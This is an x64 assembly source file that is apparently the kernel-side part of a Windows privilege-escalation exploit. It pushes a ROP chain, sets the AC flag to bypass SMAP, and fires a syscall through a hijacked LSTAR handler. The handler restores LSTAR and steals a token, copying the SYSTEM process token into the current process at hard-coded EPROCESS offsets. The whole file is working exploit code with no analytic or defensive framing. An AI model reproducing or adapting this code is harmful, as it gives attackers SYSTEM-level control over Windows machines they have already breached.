.code

PUBLIC TriggerSyscall_Return
EXTERN g_originalLSTAR:QWORD
EXTERN g_SystemProcessAddress:QWORD;

TriggerSyscall PROC

    ; prep stack here (add rop chain)
    mov rax, 9h
    push_next_gadget:
        push [rcx]
        add rcx, 8h
        dec rax
        jnz push_next_gadget

    ; set AC flag to disable SMAP - must be done in usermode
    ; AC flag is preserved through SYSCALL
    pushfq
    or qword ptr [rsp], 40000h
    popfq

    ; make a syscall to trigger the rop chain
    mov eax, 36
    syscall
    ret
TriggerSyscall ENDP

TriggerSyscall_Return:
    ret

SyscallHandler PROC
    swapgs

    ; restore LSTAR - AC flag already set so g_originalLSTAR access is safe
    mov ecx, 0c0000082h
    mov rax, g_originalLSTAR
    mov rdx, rax
    shr rdx, 20h
    and eax, 0ffffffffh
    wrmsr

    ; token stealing here
    xor rax, rax                                  ; rax = 0
    mov rax, gs:[rax + 188h]                      ; rax = *CurrentThread
    mov rax, [rax + 0b8h]                         ; rax = *ApcState.Process

    mov rcx, g_SystemProcessAddress               ; move pointer to system _eprocess into rcx

    mov rcx, qword ptr [rcx]                      ; dereference the pointer

    mov rcx, qword ptr [rcx + 4b8h]               ; rcx = system token
    and cl, 0f0h                                  ; clear out _ex_fast_ref RefCnt
    mov qword ptr [rax + 4b8h], rcx               ; copy the token


    ; clear AC flag in R11 before SYSRET restores RFLAGS
    and r11, NOT 40000h

    swapgs
    ret
SyscallHandler ENDP

END
